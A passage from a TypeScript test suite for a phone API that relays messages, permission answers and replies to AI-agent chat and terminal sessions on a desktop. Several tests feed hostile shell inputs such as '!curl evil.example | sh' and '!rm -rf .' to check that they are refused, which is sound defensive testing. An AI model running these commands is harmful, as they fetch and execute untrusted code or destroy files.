    expect(d.calls.find((c) => c.channel === 'tasks:update')?.req).toEqual({ id: 'ta_rev', patch: { status: 'canceled' } })
    await expect(api.handle('cancelTask', { companyId: 'co_a', taskId: 'ta_run' }, {}, dev)).rejects.toMatchObject({ status: 409 })
    // no "always allow" from the phone, in a chat either
    await expect(api.handle('sessionAnswer', { companyId: 'co_a', sessionId: 'se_a' }, { requestId: 'r1', decision: { kind: 'allowAlways', suggestion: 0 } }, dev)).rejects.toMatchObject({ status: 400 })
  })
  it('a session ask offers no rule ("always", sug_, allow this step) on the phone', () => {
    const { d } = world()
    expect(phoneOptions(d.asks[1]!).map((o) => o.id)).toEqual(['allow'])
    expect(phoneOptions(d.asks[0]!).map((o) => o.id)).toEqual(['allow', 'deny'])
  })
  it('a message to an agent goes straight into its own chat: no task, no fixed reply', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    const out = (await api.handle('agentSend', { companyId: 'co_a', agentId: 'ag_a' }, { text: 'just do it bro' }, dev)) as { sessionId: string }
    expect(out.sessionId).toBe('se_agent')
    expect(d.calls.find((c) => c.channel === 'chat:sendAgent')?.req).toEqual({ agentId: 'ag_a', text: 'just do it bro' })
    expect(d.calls.some((c) => c.channel === 'tasks:create' || c.channel === 'tasks:comment' || c.channel === 'tasks:start')).toBe(false)
  })
  it('New chat: Claude directly in this company (the Mac\'s New conversation), or the agent\'s own chat', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    const out = (await api.handle('newChat', { companyId: 'co_a' }, { text: '  Can you draft the spring menu?  ' }, dev)) as { sessionId: string }
    expect(out).toEqual({ sessionId: 'se_new' })
    expect(d.calls.find((c) => c.channel === 'newChat')?.req).toEqual({ companyId: 'co_a', text: 'Can you draft the spring menu?', title: 'Draft the spring menu' })
    const withAgent = (await api.handle('newChat', { companyId: 'co_a' }, { text: 'hi', agentId: 'ag_a' }, dev)) as { sessionId: string }
    expect(withAgent).toEqual({ sessionId: 'se_agent' })
    // To: offers this company's agents only
    expect(((await api.handle('chats', { companyId: 'co_a' }, {}, dev)) as { team: { id: string }[] }).team.map((m) => m.id)).toEqual(['ag_a'])
    expect(d.calls.find((c) => c.channel === 'chat:sendAgent')?.req).toEqual({ agentId: 'ag_a', text: 'hi' })
  })
  it('New chat: another company\'s agent or an unknown company is 404, an empty message 400, nothing starts', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    await expect(api.handle('newChat', { companyId: 'co_a' }, { text: 'hi', agentId: 'ag_b' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('newChat', { companyId: 'co_zzz' }, { text: 'hi' }, dev)).rejects.toMatchObject({ status: 404 })
    await expect(api.handle('newChat', { companyId: 'co_a' }, { text: '   ' }, dev)).rejects.toMatchObject({ status: 400 })
    await expect(api.handle('newChat', { companyId: 'co_a' }, { text: 'hi', cwd: '/' }, dev)).rejects.toMatchObject({ status: 400 })
    expect(d.calls.filter((c) => c.channel === 'newChat' || c.channel === 'chat:sendAgent')).toEqual([])
  })
  it('an agent on the phone opens its own chat: the agent view names it, so the phone reads it with the chat model', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    expect(((await api.handle('agent', { companyId: 'co_a', agentId: 'ag_a' }, {}, dev)) as { chatSessionId: string | null }).chatSessionId).toBeNull()
    d.sessions.push({ ...sess('se_old', 'co_a'), status: 'exited', companyAgentId: 'ag_a' } as never, { ...sess('se_chat', 'co_a'), companyAgentId: 'ag_a' } as never)
    expect(((await api.handle('agent', { companyId: 'co_a', agentId: 'ag_a' }, {}, dev)) as { chatSessionId: string | null }).chatSessionId).toBe('se_chat')
  })
  it('after a restart the phone still reaches an agent: its ended chat reads, and a message reopens it through the agent', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    d.sessions.push({ ...sess('se_old', 'co_a'), status: 'exited', companyAgentId: 'ag_a', title: 'Livia · Copywriter' } as never)
    const view = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_old' }, {}, dev)) as { chat: unknown; terminal: unknown; who: { name: string; role: string } }
    expect(view.chat).not.toBeNull()
    expect(view.terminal).toBeNull()
    // it speaks as the agent (its persona and role), never as "Claude"
    expect(view.who.name).not.toBe('Claude')
    expect(view.who.role).toBe('Copywriter')
    const out = (await api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_old' }, { text: 'still there?' }, dev)) as { ok: boolean; sessionId?: string }
    expect(out).toEqual({ ok: true, sessionId: 'se_agent' })
    expect(d.calls.find((c) => c.channel === 'chat:sendAgent')?.req).toEqual({ agentId: 'ag_a', text: 'still there?' })
    expect(d.calls.some((c) => c.channel === 'chat:send')).toBe(false)
  })
  it('the first message to an agent keeps what its screen showed: the desk thread from before its chat stays above the chat', async () => {
    const { host, d, fire } = world()
    const api = new PhoneApi(host)
    // no chat yet: the agent's screen is its desk thread (its tasks and reports)
    const desk = (await api.handle('agent', { companyId: 'co_a', agentId: 'ag_a' }, {}, dev)) as { items: { text?: string }[]; chatSessionId: string | null }
    expect(desk.chatSessionId).toBeNull()
    expect(desk.items.map((i) => i.text)).toContain('Seven posts are ready.')
    // "Ok can you post them?": the agent's chat starts and the phone follows it there
    const out = (await api.handle('agentSend', { companyId: 'co_a', agentId: 'ag_a' }, { text: 'Ok can you post them?' }, dev)) as { sessionId: string }
    d.sessions.push(sess(out.sessionId, 'co_a', { companyAgentId: 'ag_a', startedAt: '2026-10-26T09:00:00.000Z' }))
    const words = (items: ChatSnapshot['items']): string[] => items.map((i) => (i.kind === 'text' ? i.md : i.kind === 'user' || i.kind === 'notice' ? i.text : i.kind))
    const view = (await api.handle('session', { companyId: 'co_a', sessionId: out.sessionId }, {}, dev)) as { chat: ChatSnapshot }
    expect(words(view.chat.items)).toContain('Seven posts are ready.')
    // a reset (the chat rebuilt from its transcript) keeps it in front too
    const sent: PhoneServerMsg[] = []
    api.socket({ OPEN: 1, readyState: 1, send: (t: string) => sent.push(JSON.parse(t)), on: () => undefined } as unknown as WebSocket, dev)
    await api.subscribe(api.subscriptions()[0]!, { t: 'sub', companyId: 'co_a', sessionId: out.sessionId })
    fire('chat:ops', { sessionId: out.sessionId, seq: 2, ops: [{ op: 'reset', items: [{ id: 'u1', parent: null, kind: 'user', text: 'Ok can you post them?', images: 0, state: 'sent' }] }] })
    const reset = sent.find((m) => m.t === 'chat') as { ops: { op: string; items: ChatSnapshot['items'] }[] }
    expect(words(reset.ops[0]!.items)).toEqual([...words(view.chat.items), 'Ok can you post them?'])
    // an agent's history from after its chat began is the chat's own; a chat of yours gets nothing added
    const plain = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_a' }, {}, dev)) as { chat: ChatSnapshot }
    expect(plain.chat.items).toEqual([])
    api.dispose()
  })
  it('a Codex agent chat reads and replies on the phone like a Claude one', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    d.sessions.push({ ...sess('se_codex', 'co_a'), adapter: 'codex', companyAgentId: 'ag_a' } as never, { ...sess('se_plain', 'co_a'), adapter: 'codex' } as never)
    expect(((await api.handle('session', { companyId: 'co_a', sessionId: 'se_codex' }, {}, dev)) as { chat: unknown }).chat).not.toBeNull()
    // a Codex chat of yours (no agent) is a chat too
    expect(((await api.handle('session', { companyId: 'co_a', sessionId: 'se_plain' }, {}, dev)) as { chat: unknown }).chat).not.toBeNull()
    await api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_plain' }, { text: 'hi' }, dev)
    expect(d.calls.find((c) => c.channel === 'chat:send')?.req).toEqual({ id: 'se_plain', text: 'hi' })
    await api.handle('sessionStop', { companyId: 'co_a', sessionId: 'se_codex' }, {}, dev)
    expect(d.calls.find((c) => c.channel === 'chat:interrupt')?.req).toEqual({ id: 'se_codex' })
  })
  it('the room posts through forum:post (the responder answers @mentions)', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    const room = (await api.handle('room', { companyId: 'co_a' }, {}, dev)) as { channelId: string; members: { handle: string }[] }
    expect(room.channelId).toBe('ch_a')
    expect(room.members.map((m) => m.handle)).toContain('livia')
    await api.handle('roomPost', { companyId: 'co_a' }, { channelId: 'ch_a', text: '@livia hi' }, dev)
    expect(d.calls.find((c) => c.channel === 'forum:post')?.req).toEqual({ companyId: 'co_a', channelId: 'ch_a', text: '@livia hi' })
  })
})

// ---------- terminal replies (RA3: plain words only) ----------
describe('terminal replies from the phone', () => {
  it('refuse shell, slash commands and memory notes; control characters and line breaks go', () => {
    for (const bad of ['!touch /tmp/x', '  !ls', '/permissions', '# remember this', '\u001b[2K!rm -rf x', '\n/model opus']) expect(() => terminalReply(bad)).toThrow(/Plain words only/)
    expect(terminalReply('yes, go ahead')).toBe('yes, go ahead')
    expect(terminalReply('line one\nline two\r')).toBe('line one line two')
    expect(terminalReply('ok\u0003\u0015 then')).toBe('ok then')
    expect(terminalReply('say 100% / mostly')).toBe('say 100% / mostly')
    expect(() => terminalReply('\u0007\u001b')).toThrow(/Write something/)
  })
  it('the reply route never types a command into the CLI prompt', async () => {
    const { host, d } = world()
    d.sessions = [...d.sessions, sess('se_t', 'co_a', { adapter: 'claude' })]
    d.agents = [...d.agents, node('n_t', { kind: 'session', sessionId: 'se_t', status: 'needs_you', needs: 'idle', companyId: 'co_a' })]
    const api = new PhoneApi(host)
    await expect(api.handle('sessionReply', { companyId: 'co_a', sessionId: 'se_t' }, { text: '!curl evil.example | sh' }, dev)).rejects.toMatchObject({ status: 400 })
    await expect(api.handle('sessionReply', { companyId: 'co_a', sessionId: 'se_t' }, { text: '/permissions' }, dev)).rejects.toMatchObject({ status: 400 })
    expect(d.calls.some((c) => c.channel === 'agents:reply')).toBe(false)
    await api.handle('sessionReply', { companyId: 'co_a', sessionId: 'se_t' }, { text: 'Yes,\nship it' }, dev)
    expect(d.calls.find((c) => c.channel === 'agents:reply')?.req).toEqual({ agentId: 'n_t', text: 'Yes, ship it' })
  })
  it('Stop can send the queue now (the Mac’s Send now)', async () => {
    const { host, d } = world()
    const api = new PhoneApi(host)
    await api.handle('sessionStop', { companyId: 'co_a', sessionId: 'se_a' }, { sendNow: true }, dev)
    expect(d.calls.find((c) => c.channel === 'chat:interrupt')?.req).toEqual({ id: 'se_a', sendNow: true })
    await expect(api.handle('sessionStop', { companyId: 'co_a', sessionId: 'se_a' }, { sendNow: 'yes' }, dev)).rejects.toMatchObject({ status: 400 })
  })
  it('the room says who is replying in this channel', async () => {
    const { host, d } = world()
    d.runs = [
      { id: 'run_r', companyId: 'co_a', agentId: 'ag_a', title: 'Forum reply in #general', status: 'running' },
      { id: 'run_o', companyId: 'co_a', agentId: 'ag_a', title: 'Forum reply in #general-2', status: 'running' },
      { id: 'run_b', companyId: 'co_b', agentId: 'ag_b', title: 'Forum reply in #general', status: 'running' }
    ]
    const api = new PhoneApi(host)
    const room = (await api.handle('room', { companyId: 'co_a' }, {}, dev)) as { answering: string[] }
    expect(room.answering).toEqual(['Livia'])
  })
  it('a working task card carries what its run is doing now (the phone working line, CHAT-UI.md §8)', async () => {
    const { host, d } = world()
    const card = (id: string, taskId: string, state: 'working' | 'queued', runId: string | null): ForumMessage => ({ ...msg(id, 'co_a', 'ch_a', `Livia started ${taskId}`), kind: 'system', task: { taskId, identifier: taskId.toUpperCase(), title: 'Spring menu', agentId: 'ag_a', filedBy: null, state, runId, startedAt: T } })
    d.roomMessages = [card('fm_w', 'ta_run', 'working', 'run_a'), card('fm_q', 'ta_q', 'queued', null)]
    d.agents = [...d.agents, node('n_old', { runId: 'run_a', status: 'done', activity: 'Read old.md', updatedAt: '2026-01-01T00:00:00.000Z' })]
    const api = new PhoneApi(host)
    const room = (await api.handle('room', { companyId: 'co_a' }, {}, dev)) as { messages: { id: string; task?: { state: string; activity?: string } }[] }
    const w = room.messages.find((m) => m.id === 'fm_w')!
    // the run's newest root, in plain words (no code in this company)
    expect(w.task).toMatchObject({ state: 'working', activity: 'Working on it' })
    expect(room.messages.find((m) => m.id === 'fm_q')!.task!.activity).toBeUndefined()
    expect(d.calls.filter((c) => c.channel === 'agents:list' && (c.req as { runId?: string }).runId).map((c) => (c.req as { runId: string }).runId)).toEqual(['run_a'])
  })
})

// ---------- live socket fan-out ----------
describe('PhoneApi live (RA3)', () => {
  function fakeWs() {
    const sent: PhoneServerMsg[] = []
    const handlers: Record<string, ((x?: unknown) => void)[]> = {}
    const ws = { OPEN: 1, readyState: 1, send: (t: string) => sent.push(JSON.parse(t)), on: (e: string, f: (x?: unknown) => void) => (handlers[e] ??= []).push(f) }
    return { ws: ws as unknown as WebSocket, sent, emit: (e: string, x?: unknown) => handlers[e]?.forEach((f) => f(x)) }
  }
  it('chat ops go only to the socket subscribed to that chat, room messages only to that company', async () => {
    const { host, fire } = world()
    const api = new PhoneApi(host)
    const a = fakeWs()
    const b = fakeWs()
    api.socket(a.ws, dev)
    api.socket(b.ws, dev)
    await api.subscribe(api.subscriptions()[0]!, { t: 'sub', companyId: 'co_a', sessionId: 'se_a', channelId: 'ch_a' })
    await api.subscribe(api.subscriptions()[1]!, { t: 'sub', companyId: 'co_b', sessionId: 'se_a', channelId: 'ch_a' })
    // B asked for A's chat and channel: refused (nothing subscribed)
    expect(api.subscriptions()[1]).toMatchObject({ companyId: null, sessionId: null, channelId: null })
    fire('chat:ops', { sessionId: 'se_a', seq: 2, ops: [{ op: 'state', turn: 'working' }] })
    fire('forum:event', { kind: 'message', companyId: 'co_a', message: msg('fm_9', 'co_a', 'ch_a', 'hi') })
    fire('forum:event', { kind: 'message', companyId: 'co_b', message: msg('fm_8', 'co_b', 'ch_b', 'secret') })
    expect(a.sent.map((m) => m.t)).toEqual(['hello', 'subbed', 'chat', 'room'])
    expect(b.sent.map((m) => m.t)).toEqual(['hello'])
    expect(JSON.stringify(a.sent)).not.toContain('secret')
    api.dispose()
  })
  it('a subscription is acked with the chat’s last op number, so a phone whose snapshot is older refetches (PQ-02)', async () => {
    const { host, fire } = world()
    const api = new PhoneApi(host)
    const a = fakeWs()
    api.socket(a.ws, dev)
    const sub = api.subscriptions()[0]!
    // ops the phone was not subscribed for yet (it was fetching its snapshot): numbered here all the same
    fire('chat:ops', { sessionId: 'se_a', seq: 763, ops: [{ op: 'append', id: 't1', field: 'md', text: 'science' }] })
    fire('chat:ops', { sessionId: 'se_a', seq: 764, ops: [{ op: 'state', turn: 'idle' }] })
    await api.subscribe(sub, { t: 'sub', companyId: 'co_a', sessionId: 'se_a' })
    expect(a.sent.filter((m) => m.t !== 'hello')).toEqual([{ t: 'subbed', sessionId: 'se_a', seq: 764 }])
    // no chat: 0
    await api.subscribe(sub, { t: 'sub', companyId: 'co_a', sessionId: null })
    expect(a.sent.at(-1)).toEqual({ t: 'subbed', sessionId: null, seq: 0 })
    api.dispose()
  })
  it('two subs in a row: the newer one wins even when the older one finishes its checks last', async () => {
    const { host } = world()
    const api = new PhoneApi(host)
    const a = fakeWs()
    api.socket(a.ws, dev)
    const sub = api.subscriptions()[0]!
    const older = api.subscribe(sub, { t: 'sub', companyId: 'co_a', sessionId: 'se_a', channelId: 'ch_a' })
    const newer = api.subscribe(sub, { t: 'sub', companyId: 'co_a', sessionId: null })
    await newer
    await older
    expect(sub).toMatchObject({ companyId: 'co_a', sessionId: null })
    api.dispose()
  })
})

// ---------- views ----------
describe('Phone views (the desktop’s one live source)', () => {
  it('deskHistory: the desk thread before the chat began, as chat items (yours, the agent’s, quiet lines)', () => {
    const items = deskHistory(
      [
        { kind: 'task', id: 'a1', at: '2026-10-25T09:00:00.000Z', taskId: 't', text: 'PR-17 · Combine the PRs (from you)' },
        { kind: 'me', id: 'a2', at: '2026-10-25T09:01:00.000Z', taskId: 't', text: 'one PR please' },
        { kind: 'agent', id: 'a3', at: '2026-10-25T09:30:00.000Z', taskId: 't', text: 'PR #85 is ready.', card: 'review' },
        { kind: 'note', id: 'a4', at: '2026-10-26T10:00:00.000Z', taskId: 't', text: 'You approved PR-17' }
      ],
      '2026-10-26T00:00:00.000Z'
    )
    expect(items.map((i) => [i.id, i.kind])).toEqual([['desk_a1', 'notice'], ['desk_a2', 'user'], ['desk_a3', 'text']])
    expect(items[1]).toMatchObject({ text: 'one PR please', state: 'sent', at: Date.parse('2026-10-25T09:01:00.000Z') })
    expect(items[2]).toMatchObject({ md: 'PR #85 is ready.', streaming: false })
  })
  const data = (): PhoneData => {
    const { d } = world()
    // the working step has no open ask here (an agent with an ask needs you instead of working)
    return { companies: d.companies.filter((c) => !c.archivedAt), agents: d.agents, asks: d.asks.filter((a) => a.id !== 'ask_a'), sessions: d.sessions, tasks: d.tasks, companyAgents: d.seats, departments: [], repos: [], personas: true, departmentsOn: true, seen: new Set() }
  }
  it('Now: who works with the plain activity sentence, recent finished work, the needs count', () => {
    const now = phoneNow(data(), 'co_a')
    expect(now.working).toHaveLength(1)
    expect(now.working[0]!.title).toBe('Spring menu')
    expect(now.working[0]!.who?.role).toBe('Copywriter')
    expect(now.working[0]!.activity).not.toMatch(/Bash/)
    expect(now.working[0]!.open).toEqual({ kind: 'agent', id: 'ag_a' })
    expect(now.done.map((x) => x.status)).toEqual(['review'])
    expect(now.needs).toBe(phoneNeeds(data(), 'co_a').count)
  })
  it('Now: a session\'s working time counts from its current turn, not from when the session began (PQ-19)', () => {
    const d = data()
    d.agents = [...d.agents, node('n_chat', { kind: 'session', sessionId: 'se_a', status: 'working', companyId: 'co_a', startedAt: '2026-10-25T09:00:00.000Z' })]
    const row = (m?: Map<string, string>) => phoneNow(d, 'co_a', [], new Map(), m).working.find((w) => w.key.includes('n_chat') || w.open?.id === 'se_a')
    expect(row()?.startedAt).toBe('2026-10-25T09:00:00.000Z')
    expect(row(new Map([['se_a', '2026-10-25T09:58:00.000Z']]))?.startedAt).toBe('2026-10-25T09:58:00.000Z')
  })
  it('a permission reads as a plain question on the phone; Write creates (PQ-13, PQ-14)', () => {
    expect(askHeading('Write', { file_path: '/x/y/qa-notes.txt' })).toBe('Create qa-notes.txt?')
    expect(askHeading('Edit', { file_path: '/x/a.ts' })).toBe('Edit a.ts?')
    expect(askHeading('Bash', { command: 'F=/var/tmp/x ls' })).toBe('Run a command?')
    expect(askHeading('WebFetch', { url: 'https://example.com/a' })).toBe('Open example.com?')
    expect(askHeading('mcp__x__y', {})).toBeNull()
  })
  it('Chats: an ended session that Continue replaced is not listed twice (PQ-15)', () => {
    const d = data()
    d.sessions = [...d.sessions, sess('se_old', 'co_a', { title: 'QA term', status: 'exited', agentSessionId: 'conv-1', startedAt: '2026-10-25T08:00:00.000Z' } as Partial<Session>), sess('se_new', 'co_a', { title: 'QA term', agentSessionId: 'conv-1', startedAt: '2026-10-25T09:00:00.000Z' } as Partial<Session>), sess('se_lone', 'co_a', { title: 'Ended alone', status: 'exited', agentSessionId: 'conv-2' } as Partial<Session>)]
    const ids = phoneChats(d, 'co_a').rows.map((r) => r.ref.id)
    expect(ids).toContain('se_new')
    expect(ids).toContain('se_lone')
    expect(ids).not.toContain('se_old')
  })
  it('Now carries the company\'s Autopilot switch, read-only, from the same truth as the Mac (AUTOPILOT.md §7)', () => {
    const d = data()
    expect(phoneNow(d, 'co_a').autopilot).toBe('off')
    const on = { ...d, companies: d.companies.map((c) => (c.id === 'co_a' ? { ...c, autopilot: true } : c.id === 'co_b' ? { ...c, autopilot: true, pausedAt: T } : c)) }
    expect(phoneNow(on, 'co_a').autopilot).toBe('on')
    expect(phoneNow(on, 'co_b').autopilot).toBe('held')
    expect(phoneNow(on, 'co_personal').autopilot).toBeUndefined()
  })
  it('a run with no task reads as words with its agent (a Forum reply), never its prompt', () => {
    expect(runTitle('Forum reply in #general <principia-role department="Marketing" agent="Copywriter">')).toBe('Forum reply in #general')
    expect(runTitle('<principia-role>x')).toBe('A run')
    const d = data()
    const now = phoneNow(d, 'co_a', [{ run: { id: 'run_f', companyId: 'co_a', agentId: 'ag_a', title: 'Forum reply in #general <principia-role department="Marketi…', status: 'passed', endedAt: T } } as never])
    const row = now.done.find((x) => x.key === 'run:run_f')!
    expect(row.title).toBe('Forum reply in #general')
    expect(row.who?.role).toBe('Copywriter')
  })
  it('a chat of yours is named by its title on Now and Needs you', () => {
    const d = data()
    d.agents = [...d.agents, node('n_c', { kind: 'session', sessionId: 'se_a', status: 'working', companyId: 'co_a' })]
    const w = phoneNow(d, 'co_a').working.find((x) => x.open?.id === 'se_a')
    expect(w?.who).toMatchObject({ name: 'Chat se_a', role: 'Your chat with Claude' })
  })
  it('companies carry the same counts the desktop rail shows', () => {
    const cs = phoneCompanies(data())
    expect(cs.find((c) => c.id === 'co_a')).toMatchObject({ working: 1 })
    expect(cs.find((c) => c.id === 'co_b')!.needs).toBeGreaterThan(0)
    expect(cs.find((c) => c.id === 'co_personal')!.personal).toBe(true)
  })
  it('a finished turn the phone looked at leaves Needs you', () => {
    const d = data()
    const before = phoneNeeds(d, 'co_b').asks.length
    const after = phoneNeeds({ ...d, asks: [], seen: new Set(['n_sb']) }, 'co_b').asks.length
    expect(before).toBeGreaterThan(after)
  })
  it('Chats: live first; the agent thread covers its task run', () => {
    const rows = phoneChats(data(), 'co_a').rows
    expect(rows[0]).toMatchObject({ key: 'agent:ag_a', live: true })
  })
})

// ---------- a terminal session on the phone (RA3: read it live, type into it, continue it) ----------
describe('a terminal session on the phone', () => {
  let dir: string
  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pp-api-term-'))
  })
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

  function termWorld() {
    const w = world()
    const file = path.join(dir, 'conv-t.jsonl')
    fs.writeFileSync(file, [{ type: 'user', message: { role: 'user', content: 'Fix the footer' } }, { type: 'assistant', message: { id: 'm1', role: 'assistant', model: 'x', content: [{ type: 'text', text: 'On it.' }] } }].map((r) => JSON.stringify(r)).join('\n') + '\n')
    const typed: { sessionId: string; text: string }[] = []
    let refuse: string | null = null
    const inner = w.host.invoke
    // a Claude pane in terminal mode: its chat snapshot is the terminal's (no chat to show)
    w.host.invoke = (async (c: string, req: { id: string }) => (c === 'chat:snapshot' ? { ...snap(req.id), mode: 'terminal', available: false } : (inner as (c: string, r: unknown) => Promise<unknown>)(c, req))) as PhoneHost['invoke']
    w.host.terminal = {
      transcript: (s) => (s.agentSessionId === 'conv-t' ? { file, format: 'claude' } : null),
      screen: () => 'Reading footer.html',
      type: (sessionId, text) => {
        if (refuse) throw new HiveError('conflict', refuse)
        typed.push({ sessionId, text })
      },
      redact: (t) => t
    }
    w.d.sessions = [...w.d.sessions, sess('se_t', 'co_a', { agentSessionId: 'conv-t' }), sess('se_x', 'co_a', { status: 'exited', agentSessionId: 'conv-t' }), sess('se_cx', 'co_a', { status: 'exited', adapter: 'codex' })]
    w.d.agents = [...w.d.agents, node('n_t', { kind: 'session', sessionId: 'se_t', status: 'working', activity: 'Bash npm test', companyId: 'co_a' })]
    return { ...w, typed, refuse: (m: string | null) => (refuse = m) }
  }

  it('reads as a live chat from its transcript, with a composer while it works', async () => {
    const { host } = termWorld()
    const api = new PhoneApi(host, { feedTickMs: null })
    const v = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_t' }, {}, dev)) as PhoneSession
    expect(v.chat?.mode).toBe('terminal')
    expect(v.chat?.items.map((i) => i.kind)).toEqual(['user', 'text'])
    expect(v.chat?.turn).toBe('working')
    expect(v.terminal).toMatchObject({ ended: false, canType: true, source: 'transcript', canContinue: false, asks: [] })
    expect(api.feeds?.size()).toBe(1)
    api.dispose()
  })
  it('a message while it works is typed in (line breaks kept, commands refused); waiting at its prompt it is the guarded reply', async () => {
    const { host, d, typed } = termWorld()
    const api = new PhoneApi(host, { feedTickMs: null })
    await api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_t' }, { text: 'also the header\r\nthanks\u001b[201~' }, dev)
    expect(typed).toEqual([{ sessionId: 'se_t', text: 'also the header\nthanks' }])
    await expect(api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_t' }, { text: '!rm -rf .' }, dev)).rejects.toMatchObject({ status: 400 })
    expect(d.calls.some((c) => c.channel === 'chat:send')).toBe(false)
    d.agents = d.agents.map((a) => (a.id === 'n_t' ? { ...a, status: 'needs_you', needs: 'idle' } : a))
    await api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_t' }, { text: 'go on' }, dev)
    expect(d.calls.find((c) => c.channel === 'agents:reply')?.req).toEqual({ agentId: 'n_t', text: 'go on' })
    expect(typed.length).toBe(1)
    api.dispose()
  })
  it('while it asks something the message is refused in plain words, and the ask shows in the conversation', async () => {
    const { host, d, refuse } = termWorld()
    d.asks = [...d.asks, ask('ask_t', { agentId: 'n_t', rootId: 'n_t', sessionId: 'se_t', companyId: 'co_a', options: [{ id: 'allow', label: 'Allow', kind: 'allow' }, { id: 'deny', label: 'Deny', kind: 'deny' }] })]
    d.agents = d.agents.map((a) => (a.id === 'n_t' ? { ...a, status: 'needs_you', needs: 'permission' } : a))
    const api = new PhoneApi(host, { feedTickMs: null })
    const v = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_t' }, {}, dev)) as PhoneSession
    expect(v.terminal?.asks?.map((a) => a.id)).toEqual(['ask_t'])
    expect(v.terminal?.canType).toBe(false)
    refuse('It is asking you something. Answer that first, then send your message.')
    await expect(api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_t' }, { text: 'hello' }, dev)).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/asking you something/) })
    api.dispose()
  })
  it('a choice on its screen (no card) holds the composer with the reason', async () => {
    const { host } = termWorld()
    host.terminal!.held = () => 'It is showing a choice in the terminal. Answer it on your Mac first.'
    const api = new PhoneApi(host, { feedTickMs: null })
    const v = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_t' }, {}, dev)) as PhoneSession
    expect(v.terminal).toMatchObject({ canType: false, held: 'It is showing a choice in the terminal. Answer it on your Mac first.' })
    api.dispose()
  })
  it('a Gemini pane takes a message only at its prompt (no paste); a shell has no composer', async () => {
    const { host, d, typed } = termWorld()
    d.sessions = [...d.sessions, sess('se_g', 'co_a', { adapter: 'gemini' }), sess('se_sh', 'co_a', { adapter: 'shell' })]
    d.agents = [...d.agents, node('n_g', { kind: 'session', sessionId: 'se_g', status: 'working', companyId: 'co_a' }), node('n_sh', { kind: 'session', sessionId: 'se_sh', status: 'needs_you', needs: 'idle', companyId: 'co_a' })]
    const api = new PhoneApi(host, { feedTickMs: null })
    const g = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_g' }, {}, dev)) as PhoneSession
    expect(g.terminal).toMatchObject({ canType: false, canReply: false, held: 'It takes a message when it waits at its prompt.' })
    await expect(api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_g' }, { text: 'carry on' }, dev)).rejects.toMatchObject({ status: 409, message: 'It takes a message when it waits at its prompt.' })
    expect(typed).toEqual([])
    d.agents = d.agents.map((a) => (a.id === 'n_g' ? { ...a, status: 'needs_you', needs: 'idle' } : a))
    const gi = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_g' }, {}, dev)) as PhoneSession
    expect(gi.terminal).toMatchObject({ canType: false, canReply: true, held: null })
    await api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_g' }, { text: 'go on' }, dev)
    expect(d.calls.find((c) => c.channel === 'agents:reply')?.req).toEqual({ agentId: 'n_g', text: 'go on' })
    // a shell: nothing to type into from the phone, never "This session has ended"
    const sh = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_sh' }, {}, dev)) as PhoneSession
    expect(sh.terminal).toMatchObject({ canType: false, canReply: false, held: null })
    await expect(api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_sh' }, { text: 'ls' }, dev)).rejects.toMatchObject({ status: 409, message: 'This is a shell. Type in it on your Mac.' })
    expect(typed).toEqual([])
    api.dispose()
  })
  it('ended: its history reads, and Continue resumes it on the Mac (once); a Codex pane cannot', async () => {
    const { host, d } = termWorld()
    const api = new PhoneApi(host, { feedTickMs: null })
    const v = (await api.handle('session', { companyId: 'co_a', sessionId: 'se_x' }, {}, dev)) as PhoneSession
    expect(v.chat?.items.map((i) => i.kind)).toEqual(['user', 'text'])
    expect(v.chat?.turn).toBe('ended')
    expect(v.terminal).toMatchObject({ ended: true, canType: false, canContinue: true })
    await expect(api.handle('sessionSend', { companyId: 'co_a', sessionId: 'se_x' }, { text: 'hi' }, dev)).rejects.toMatchObject({ status: 409, message: 'This one ended. Continue it first.' })
    // se_t still runs in that conversation: Continue follows it, no second session
    expect(await api.handle('sessionContinue', { companyId: 'co_a', sessionId: 'se_x' }, {}, dev)).toEqual({ ok: true, sessionId: 'se_t' })
    d.sessions = d.sessions.filter((x) => x.id !== 'se_t')
    expect(await api.handle('sessionContinue', { companyId: 'co_a', sessionId: 'se_x' }, {}, dev)).toEqual({ ok: true, sessionId: 'se_next' })
    expect(d.calls.filter((c) => c.channel === 'sessions:restart').map((c) => c.req)).toEqual([{ id: 'se_x' }])
    await expect(api.handle('sessionContinue', { companyId: 'co_a', sessionId: 'se_cx' }, {}, dev)).rejects.toMatchObject({ status: 409 })
    // another company's session is not found
    await expect(api.handle('sessionContinue', { companyId: 'co_b', sessionId: 'se_x' }, {}, dev)).rejects.toMatchObject({ status: 404 })
    api.dispose()
  })
  it('the live socket: the feed’s ops go only to phones on that session; the Mac’s own terminal-mode ops never mix in', async () => {
    const { host, fire } = termWorld()
    const api = new PhoneApi(host, { feedTickMs: null })
    await api.handle('session', { companyId: 'co_a', sessionId: 'se_t' }, {}, dev)
    const sent: { on: string; m: PhoneServerMsg }[] = []
    const fake = (on: string) => ({ readyState: 1, OPEN: 1, send: (t: string) => sent.push({ on, m: JSON.parse(t) }), on: () => undefined }) as unknown as import('ws').WebSocket
    const a = fake('a')
    const b = fake('b')
    api.socket(a, dev)
    api.socket(b, dev)
